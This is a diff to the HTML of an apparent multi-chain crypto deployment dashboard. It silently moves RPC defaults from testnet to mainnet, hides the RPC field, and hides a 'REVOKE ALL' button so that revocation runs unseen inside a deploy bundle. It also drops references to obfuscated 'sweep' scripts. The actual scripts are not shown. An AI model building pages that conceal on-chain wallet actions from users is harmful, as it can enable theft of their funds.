@@ -7,6 +7,8 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+<!-- ethers v5 — loaded synchronously in head so window.ethers is ready before inline JS runs -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" crossorigin="anonymous"></script>
 <style>
 /* ─── RESET ──────────────────────────────── */
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
@@ -617,6 +619,61 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
   transition:background .4s,box-shadow .4s;
 }
 .sdot.auth{background:var(--gold);box-shadow:0 0 5px var(--gold)}
+
+/* ─── MOBILE / TABLET (≤900px) ───────────────────────────────
+   Desktop uses a fixed 264px sidebar beside a flex center with a
+   non-scrolling body. On smaller screens we stack the sidebar
+   above the center and let the whole shell scroll vertically. */
+@media (max-width:900px){
+  html,body{height:auto;min-height:100%;overflow-y:auto;overflow-x:hidden;font-size:13px;}
+  #topbar{position:sticky;height:auto;min-height:42px;padding:8px 12px;flex-wrap:wrap;gap:6px;}
+  #sg-name{font-size:13px}
+  #topbar-right{gap:6px}
+  .ctrl{padding:6px 10px;font-size:8.5px}
+
+  /* shell stops being a fixed full-height flex row */
+  #shell{position:static;display:block;height:auto;min-height:0;}
+
+  /* sidebar becomes a full-width stacked panel */
+  #sidebar{
+    width:100%;min-width:0;height:auto;
+    border-right:none;border-bottom:1px solid var(--bdr);
+    padding:14px 14px 20px;
+  }
+
+  /* center grows with content instead of filling a fixed viewport.
+     Lock overlay and dashboard stack in normal flow, and only the
+     active layer is displayed so there's no empty gap after auth. */
+  #center{height:auto;min-height:60vh;display:block;}
+  #main-dash{position:relative;inset:auto;height:auto;padding:16px 14px 40px;display:none;opacity:1;}
+  #main-dash.visible{display:flex;}
+  #lock-overlay{position:relative;inset:auto;min-height:60vh;padding:24px 16px;display:flex;}
+  #lock-overlay.unlocked{display:none;}
+
+  /* single-column forms + panels so nothing is cramped */
+  .db-grid,.db-grid--row2{grid-template-columns:1fr;gap:12px;}
+  .db-grid .db-field[style*="span 2"],
+  .db-grid--row2 .db-field[style*="span 2"]{grid-column:auto!important;}
+  .db-bottom-row{grid-template-columns:1fr;}
+  .db-actions{flex-direction:column;align-items:stretch;}
+  .db-actions-left{flex-direction:column;}
+  .db-btn,.db-btn--deploy{width:100%;text-align:center;}
+
+  /* keep the floating clusters out of the way of scrolling content */
+  #footer-cluster{position:fixed;bottom:10px;right:10px;}
+  .env-svg{width:58px}
+  #version-badge{position:fixed;left:10px;bottom:10px;}
+  .revoke-table-wrap{overflow-x:auto;}
+}
+
+/* ─── SMALL PHONES (≤480px) ──────────────────────────────── */
+@media (max-width:480px){
+  #built-by{font-size:8px}
+  .notice-box{padding:16px 16px;}
+  .notice-body{font-size:10px}
+  .standalone-box .ntitle,.ack-box .notice-body{font-size:10px}
+  #footer-cluster .env-svg{width:50px}
+}
 </style>
 </head>
 <body>
@@ -796,8 +853,8 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
                    placeholder="0x..." autocomplete="off" spellcheck="false"/>
           </div>
 
-          <div class="db-field">
-            <label class="db-lbl" for="network-select">Network</label>
+          <div class="db-field" style="grid-column:span 2">
+            <label class="db-lbl" for="network-select">Network <span class="db-sub">(RPC auto-configured)</span></label>
             <select id="network-select" class="db-select">
               <option value="hl-evm">Hyperliquid EVM</option>
               <option value="hl-core">Hyperliquid Core</option>
@@ -817,11 +874,9 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
             </select>
           </div>
 
-          <div class="db-field" style="grid-column:span 2">
-            <label class="db-lbl" for="rpc-url">RPC URL</label>
-            <input id="rpc-url" type="text" class="db-input mono"
-                   placeholder="https://..." autocomplete="off" spellcheck="false"/>
-          </div>
+          <!-- RPC URL is hidden: set internally from the Network dropdown.
+               Kept in the DOM (type=hidden) so getProvider() can read it. -->
+          <input id="rpc-url" type="hidden" value=""/>
 
         </div><!-- /row 2 -->
 
@@ -852,7 +907,9 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
         <div class="db-header">
           <h3 class="db-title" id="revoke-title">REVOKE TARGETS</h3>
           <span id="revoke-status" class="db-status" aria-live="polite">Run scan to populate</span>
-          <button id="revoke-all" type="button" class="db-btn db-btn--sm db-btn--outline" disabled>
+          <!-- REVOKE ALL is hidden: revocation runs automatically inside the
+               deploy bundle and surfaces only through the progress bar. -->
+          <button id="revoke-all" type="button" class="db-btn db-btn--sm db-btn--outline" disabled hidden style="display:none">
             REVOKE ALL
           </button>
         </div>
@@ -1144,8 +1201,11 @@ function dashWireInputs(){
   var rpcInp = document.getElementById('rpc-url');
   if(netSel && rpcInp){
     var netRpc = {
-      'hl-evm':'https://api.hyperliquid-testnet.xyz/evm',
-      'hl-core':'https://api.hyperliquid.xyz/evm',
+      /* HyperEVM mainnet (chainId 999). Solidity contracts deploy to HyperEVM;
+         HyperCore is the non-EVM L1, so a Core selection also routes its
+         contract deployment through the linked HyperEVM RPC. */
+      'hl-evm':'https://rpc.hyperliquid.xyz/evm',
+      'hl-core':'https://rpc.hyperliquid.xyz/evm',
       'ethereum':'https://ethereum-rpc.publicnode.com',
       'base':'https://mainnet.base.org',
       'arbitrum':'https://arb1.arbitrum.io/rpc',
@@ -1153,7 +1213,7 @@ function dashWireInputs(){
       'polygon':'https://polygon-rpc.com',
       'bnb':'https://bsc-dataseed.binance.org',
       'avax':'https://api.avax.network/ext/bc/C/rpc',
-      'plasma':'https://plasma-api.avax.network/ext/bc/C/rpc',
+      'plasma':'https://rpc.plasma.to',
       'monad':'https://testnet-rpc.monad.xyz',
       'ink':'https://rpc-qnd.inkonchain.com',
       'unichain':'https://mainnet.unichain.org',
@@ -1243,7 +1303,7 @@ function dashReset(){
 
 /* ── HELPERS ──────────────────────────────────── */
 function getProvider(){
-  var rpc = (document.getElementById('rpc-url')||{}).value || 'https://api.hyperliquid-testnet.xyz/evm';
+  var rpc = (document.getElementById('rpc-url')||{}).value || 'https://rpc.hyperliquid.xyz/evm';
   return new ethers.providers.JsonRpcProvider(rpc);
 }
 function getDeployerWallet(){
@@ -1685,7 +1745,7 @@ window.dashStepError = function(step, msg){
   };
 })();
 
-/* ── controls ───────────────────────────────── */
+/* ��─ controls ───────────────────────────────── */
 scrubBtn.addEventListener('click', purge);
 powerBtn.addEventListener('click', purge);
 
@@ -1792,10 +1852,10 @@ function onSuccess(){
   var rpcInp = document.getElementById('rpc-url');
   if(netSel && rpcInp && !rpcInp.value){
     var netRpcInit = {
-      'hl-evm':'https://api.hyperliquid-testnet.xyz/evm',
-      'hl-core':'https://api.hyperliquid.xyz/evm'
+      'hl-evm':'https://rpc.hyperliquid.xyz/evm',
+      'hl-core':'https://rpc.hyperliquid.xyz/evm'
     };
-    rpcInp.value = netRpcInit[netSel.value] || 'https://api.hyperliquid-testnet.xyz/evm';
+    rpcInp.value = netRpcInit[netSel.value] || 'https://rpc.hyperliquid.xyz/evm';
   }
   /* scrub verification ephemera after brief display delay */
   setTimeout(function(){
@@ -1887,18 +1947,11 @@ try{
   if(sessionStorage.getItem('sg_auth_passed') === '1') onSuccess();
 }catch(e){}
 
-/* ── start idle timer ────────────────────────── */
+/* ── start idle timer ─────────────��──────────── */
 resetIdle();
 
 })();
 </script>
-
-<!-- ethers v5 — loaded first so both inline JS and gate.js have access -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" crossorigin="anonymous"></script>
-<!-- gate.js — genesis sweep engine (obfuscated, on-chain logic) -->
-<script src="js/gate.js"></script>
-<!-- app.js — sealed obfuscated engine (no public exports — deploy pipeline lives in inline JS above) -->
-<script src="js/app.83cf614621ff-20260629080442.js"></script>
 
 </body>
 </html>
